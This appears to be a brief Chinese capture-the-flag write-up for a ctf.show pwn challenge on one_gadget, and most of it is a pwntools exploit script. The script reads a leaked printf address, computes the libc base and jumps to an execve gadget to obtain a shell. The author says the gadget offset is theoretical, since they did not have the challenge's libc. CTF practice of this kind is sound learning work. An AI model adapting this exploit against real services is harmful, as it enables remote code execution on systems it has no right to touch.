# 挑战简介
噢？好像到现在为止还没有了解到one_gadget?

# 思路
one_gadget可以做到根据libc来测算出bin_sh  

由于没有ctfshow的libc，所以直接给理论答案了  

```
from pwn import *
context(arch="amd64",log_level="debug")
p=remote("pwn.challenge.ctf.show",28184)
libc=ELF("/home/kali/桌面/ctfshoww/libc.so.6")
execve=0x10a2fc
p.recvuntil("this:")
printfar=eval(p.recvuntil("?",drop=True))
base=printfar-libc.sym['printf']
execve_t=execve+base
p.sendline(str(execve_t))
p.interactive()
```
